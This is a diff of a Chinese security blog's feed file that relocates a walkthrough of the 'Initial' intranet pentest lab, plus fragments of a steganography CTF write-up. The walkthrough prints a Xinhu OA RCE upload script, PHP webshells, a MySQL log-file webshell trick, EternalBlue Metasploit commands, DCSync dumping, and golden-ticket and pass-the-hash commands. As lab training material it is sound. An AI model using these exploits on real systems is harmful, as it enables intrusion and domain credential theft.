-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image010.gif" class="" title="图片">
-
-<p>得到1.txt，打开得到flag</p>
-<p>flag{5cc0aa21208b517dbd0bde650247237f}</p>
-<h1 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h1><p>下载附件</p>
-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image012.gif" class="" title="图片">
-
-<p>又是lsb隐写，先拖入010看看</p>
-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image014.gif" class="" title="图片">发现了一张png和password，先binwalk分离
-
-<p>有密码的图片，还是试试lsb.py</p>
-<p>python2 lsb.py extract secret.png 1.txt 7his_1s_p4s5w0rd</p>
-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image016.gif" class="" title="图片">打开1.txt得到flag，
-
-<p>flag{2e55f884-ef01-4654-87b1-cc3111800085}</p>
-]]></content>
-      <categories>
-        <category>比赛</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -3370,6 +3370,94 @@
 </ul>
 <h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://zhuanlan.zhihu.com/p/581577873">【仿真场景】Brute4Road - 知乎 (zhihu.com)</a></p>
 <p><a href="https://blog.csdn.net/qq_45746286/article/details/128775222">靶场练习–春秋云境-Brute4Road_NooEmotion的博客-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>web笔记</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>春秋云镜 Initial</title>
+    <url>/2023/08/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20Initial/</url>
+    <content><![CDATA[<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>进入之后是一个远控登录界面</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048601.png" alt="image-20230819220629394">这里用nmap扫描了一下看了一看端口开放情况，然后fscan扫一扫，有意外收获，fscan给出其框架是tp5</p>
+<p>且存在漏洞，所以直接上工具一把梭哈</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048624.png" alt="image-20230819214623336"></p>
+<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>查看特权文件</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048632.png" alt="image-20230819214739201"></p>
+<p>发现mysql具有root权限这里查一手mysql如何提权（<a href="https://gtfobins.github.io/%EF%BC%89">https://gtfobins.github.io/）</a></p>
+<p>之后读取&#x2F;root下的flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048642.png" alt="image-20230819215031945"></p>
+<h5 id="代理搭建"><a href="#代理搭建" class="headerlink" title="代理搭建"></a>代理搭建</h5><p>这里我用的是Neo-reGeorg和Proxifier，和proxychains</p>
+<p>因为一些原因所以希望速度快些但是发现打靶机这事急不来，在操做的时候遇到了很多的玄学问题，靶机的环境一直很卡，再加上我的网络开始的时候也不是很好所以前面的时我一直处于疯狂看报错的状态；</p>
+<h6 id="小插曲之cs和msf"><a href="#小插曲之cs和msf" class="headerlink" title="小插曲之cs和msf"></a>小插曲之cs和msf</h6><p>因为是内网所以最开始的时候我很想用cs但是把linux主机上线后发现，我的插件和对插件的理解都不是很多所以最后放弃了</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048655.png" alt="image-20230819221601795"></p>
+<p>在解决报错的时候五一看到了另一个师傅的文章，师傅在拿下主机后就利用msf生成木马上线，利用msf的自生模块获取路由和做代理，感觉很流畅，有兴趣的师傅可以看一下：</p>
+<p><a href="https://xz.aliyun.com/t/12115">记一次春秋云镜域渗透靶场Initial - 先知社区 (aliyun.com)</a></p>
+<h6 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h6><p>生成对应文件及密码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 neoreg.py generate -k commit</span><br></pre></td></tr></table></figure>
+
+<p>将生成的文件上至目标靶机</p>
+<h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>这里成功拿下第一台主机之后进行信息收集，发现存在<code>172.22.1.*</code>，利用fscan进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">已完成 0/0 listen ip4:icmp 0.0.0.0: socket: operation not permitted</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.1.2      is alive</span><br><span class="line">(icmp) Target 172.22.1.15     is alive</span><br><span class="line">(icmp) Target 172.22.1.21     is alive</span><br><span class="line">(icmp) Target 172.22.1.18     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.2:88 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">[*] alive ports len is: 14</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle:http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[+] 172.22.1.21	MS17-010	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] 172.22.1.2     [+]DC XIAORANG\DC01              Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] 172.22.1.21          XIAORANG\XIAORANG-WIN7     Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] WebTitle:http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login</span><br><span class="line">[*] WebTitle:http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统</span><br><span class="line">[*] 172.22.1.18          XIAORANG\XIAORANG-OA01     Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br><span class="line">已完成 14/14</span><br><span class="line">[*] 扫描结束,耗时: 21.273785652s</span><br></pre></td></tr></table></figure>
+
+<p>信息量还是比较大的，我们发现内网中几台其余存活的主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.22.1.2        DC</span><br><span class="line">172.22.1.18       存在web服务</span><br><span class="line">172.22.1.21       存在永痕之蓝漏洞</span><br></pre></td></tr></table></figure>
+
+<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><h5 id="plan-A"><a href="#plan-A" class="headerlink" title="plan A"></a>plan A</h5><p>根据以上信息就先<code>172.22.1.18</code>下手</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048659.png" alt="image-20230819215836670"></p>
+<p>它存在这样一个OA，并且版本信息啥的都有，先弱口令试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure>
+
+<p>这个OA的版本信息都有，所以在网上搜索一下，该OA存在rce漏洞，这里用一下大师傅们的脚本</p>
+<p>脚本出处：<a href="https://blog.csdn.net/solitudi/article/details/118675321">https://blog.csdn.net/solitudi/article/details/118675321</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>我们需要在该脚本同目录下创建一个1.php其中内容为一句话木马即可<code>&lt;?php eval($_GET[&quot;1&quot;]);?&gt;</code>;</p>
+<p>到这一切都顺利接着种马成功之后环境就开始抽象起来了，我的蚁剑怎么设置都连不上（后面重置靶机就ok了，可能开始钱没充够吧）;</p>
+<h5 id="plan-B"><a href="#plan-B" class="headerlink" title="plan B"></a>plan B</h5><p>这个时候又看到了另一个师傅的文章，发现这台主机的突破点并不只有这一个，其phpmyadmin暴露，且弱口令<code>root/root</code>就可以登录，这时候可以通过mysql写马的方式来getshell;</p>
+<p>查看是否开启日志以及存放的日志位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;general%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048619.png" alt="image-20230819223201773"></p>
+<p>开启日志</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log = ON;</span><br></pre></td></tr></table></figure>
+
+<p>设置日志保存位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log_file=&quot;C:/phpStudy/PHPTutorial/WWW/shell.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>写入木马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>之后进行蚁剑连接，成功获取flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048636.png" alt="image-20230819223415581"></p>
+<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><h5 id="ms17010"><a href="#ms17010" class="headerlink" title="ms17010"></a>ms17010</h5><p>linux中设置代理<code>vim /etc/proxychains4.conf</code>;</p>
+<p>我们利用msf的攻击模块进行操作</p>
+<p>先上命令（这里有个需要注意的细节，就是我们应该进行正向连接，内网主机大多数情况下是不出网的或其出站协议是受到限制的）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>我愿称它为搞人心态的MVP，在这里我的代理开始抽象了起来</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048655.png" alt="image-20230819223845776"></p>
+<p>然后问了一下gpt它说可能是端口的问题，然后我就连换了几个，发现还是不行我的msf到最后一步的时候就显示连接超时，最后我准备再次重置的时候<code>sessions</code>了一下发现有成功上线的，之后就开始了一步三报错的路子继续了下去；</p>
+<h5 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h5><p>这里用的是DCSync进行横移</p>
+<p><a href="https://www.freebuf.com/articles/network/286137.html">内网渗透测试：DCSync 攻击技术的利用 - FreeBuf网络安全行业门户</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">导出域内用户的<span class="built_in">hash</span></span></span><br><span class="line">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048686.png" alt="image-20230819224519688"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成黄金票据</span></span><br><span class="line">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /user:krbtgt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">导入黄金票据</span></span><br><span class="line">kiwi_cmd kerberos::golden /user:administrator /domain:xiaorang.lab /sid:S-1-5-21-314492864-3856862959-4045974917-502 /krbtgt:fb812eea13a18b7fcdb8e6d67ddc205b /ptt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">wmi <span class="built_in">hash</span>传递</span></span><br><span class="line">python ./wmiexec.py -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang/administrator@172.22.1.2 &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048716.png" alt="image-20230819224904240"></p>
+<p>最后将获得的flag拼接起来即可；</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
+<li>信息收集：信息收集真的是渗透过程中的重中之重，flag2的时候没有对目标主机进行二次信息收集，导致把路走死了；</li>
+<li>横向移动：虽然看了一些方法，但是做的还是太少了所以在进行判断的时候还是你叫吃力；</li>
+<li>代理和隧道：这个真的玄学，多用几次解决报错和理解怎么做代理怎么搭隧道后面应该会慢慢好起来；</li>
+</ul>
 ]]></content>
       <categories>
         <category>笔记</category>
@@ -3575,94 +3663,6 @@
       </categories>
       <tags>
         <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>春秋云镜 Initial</title>
-    <url>/2023/08/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20Initial/</url>
-    <content><![CDATA[<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>进入之后是一个远控登录界面</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048601.png" alt="image-20230819220629394">这里用nmap扫描了一下看了一看端口开放情况，然后fscan扫一扫，有意外收获，fscan给出其框架是tp5</p>
-<p>且存在漏洞，所以直接上工具一把梭哈</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048624.png" alt="image-20230819214623336"></p>
-<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-
-<p>查看特权文件</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048632.png" alt="image-20230819214739201"></p>
-<p>发现mysql具有root权限这里查一手mysql如何提权（<a href="https://gtfobins.github.io/%EF%BC%89">https://gtfobins.github.io/）</a></p>
-<p>之后读取&#x2F;root下的flag</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048642.png" alt="image-20230819215031945"></p>
-<h5 id="代理搭建"><a href="#代理搭建" class="headerlink" title="代理搭建"></a>代理搭建</h5><p>这里我用的是Neo-reGeorg和Proxifier，和proxychains</p>
-<p>因为一些原因所以希望速度快些但是发现打靶机这事急不来，在操做的时候遇到了很多的玄学问题，靶机的环境一直很卡，再加上我的网络开始的时候也不是很好所以前面的时我一直处于疯狂看报错的状态；</p>
-<h6 id="小插曲之cs和msf"><a href="#小插曲之cs和msf" class="headerlink" title="小插曲之cs和msf"></a>小插曲之cs和msf</h6><p>因为是内网所以最开始的时候我很想用cs但是把linux主机上线后发现，我的插件和对插件的理解都不是很多所以最后放弃了</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048655.png" alt="image-20230819221601795"></p>
-<p>在解决报错的时候五一看到了另一个师傅的文章，师傅在拿下主机后就利用msf生成木马上线，利用msf的自生模块获取路由和做代理，感觉很流畅，有兴趣的师傅可以看一下：</p>
-<p><a href="https://xz.aliyun.com/t/12115">记一次春秋云镜域渗透靶场Initial - 先知社区 (aliyun.com)</a></p>
-<h6 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h6><p>生成对应文件及密码</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 neoreg.py generate -k commit</span><br></pre></td></tr></table></figure>
-
-<p>将生成的文件上至目标靶机</p>
-<h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>这里成功拿下第一台主机之后进行信息收集，发现存在<code>172.22.1.*</code>，利用fscan进行扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">已完成 0/0 listen ip4:icmp 0.0.0.0: socket: operation not permitted</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.1.2      is alive</span><br><span class="line">(icmp) Target 172.22.1.15     is alive</span><br><span class="line">(icmp) Target 172.22.1.21     is alive</span><br><span class="line">(icmp) Target 172.22.1.18     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.2:88 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">[*] alive ports len is: 14</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle:http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[+] 172.22.1.21	MS17-010	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] 172.22.1.2     [+]DC XIAORANG\DC01              Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] 172.22.1.21          XIAORANG\XIAORANG-WIN7     Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] WebTitle:http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login</span><br><span class="line">[*] WebTitle:http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统</span><br><span class="line">[*] 172.22.1.18          XIAORANG\XIAORANG-OA01     Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br><span class="line">已完成 14/14</span><br><span class="line">[*] 扫描结束,耗时: 21.273785652s</span><br></pre></td></tr></table></figure>
-
-<p>信息量还是比较大的，我们发现内网中几台其余存活的主机</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.22.1.2        DC</span><br><span class="line">172.22.1.18       存在web服务</span><br><span class="line">172.22.1.21       存在永痕之蓝漏洞</span><br></pre></td></tr></table></figure>
-
-<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><h5 id="plan-A"><a href="#plan-A" class="headerlink" title="plan A"></a>plan A</h5><p>根据以上信息就先<code>172.22.1.18</code>下手</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048659.png" alt="image-20230819215836670"></p>
-<p>它存在这样一个OA，并且版本信息啥的都有，先弱口令试一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure>
-
-<p>这个OA的版本信息都有，所以在网上搜索一下，该OA存在rce漏洞，这里用一下大师傅们的脚本</p>
-<p>脚本出处：<a href="https://blog.csdn.net/solitudi/article/details/118675321">https://blog.csdn.net/solitudi/article/details/118675321</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
-
-<p>我们需要在该脚本同目录下创建一个1.php其中内容为一句话木马即可<code>&lt;?php eval($_GET[&quot;1&quot;]);?&gt;</code>;</p>
-<p>到这一切都顺利接着种马成功之后环境就开始抽象起来了，我的蚁剑怎么设置都连不上（后面重置靶机就ok了，可能开始钱没充够吧）;</p>
-<h5 id="plan-B"><a href="#plan-B" class="headerlink" title="plan B"></a>plan B</h5><p>这个时候又看到了另一个师傅的文章，发现这台主机的突破点并不只有这一个，其phpmyadmin暴露，且弱口令<code>root/root</code>就可以登录，这时候可以通过mysql写马的方式来getshell;</p>
-<p>查看是否开启日志以及存放的日志位置</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;general%&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048619.png" alt="image-20230819223201773"></p>
-<p>开启日志</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log = ON;</span><br></pre></td></tr></table></figure>
-
-<p>设置日志保存位置</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log_file=&quot;C:/phpStudy/PHPTutorial/WWW/shell.php&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>写入木马</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>之后进行蚁剑连接，成功获取flag</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048636.png" alt="image-20230819223415581"></p>
-<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><h5 id="ms17010"><a href="#ms17010" class="headerlink" title="ms17010"></a>ms17010</h5><p>linux中设置代理<code>vim /etc/proxychains4.conf</code>;</p>
-<p>我们利用msf的攻击模块进行操作</p>
-<p>先上命令（这里有个需要注意的细节，就是我们应该进行正向连接，内网主机大多数情况下是不出网的或其出站协议是受到限制的）</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<p>我愿称它为搞人心态的MVP，在这里我的代理开始抽象了起来</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048655.png" alt="image-20230819223845776"></p>
-<p>然后问了一下gpt它说可能是端口的问题，然后我就连换了几个，发现还是不行我的msf到最后一步的时候就显示连接超时，最后我准备再次重置的时候<code>sessions</code>了一下发现有成功上线的，之后就开始了一步三报错的路子继续了下去；</p>
-<h5 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h5><p>这里用的是DCSync进行横移</p>
-<p><a href="https://www.freebuf.com/articles/network/286137.html">内网渗透测试：DCSync 攻击技术的利用 - FreeBuf网络安全行业门户</a></p>
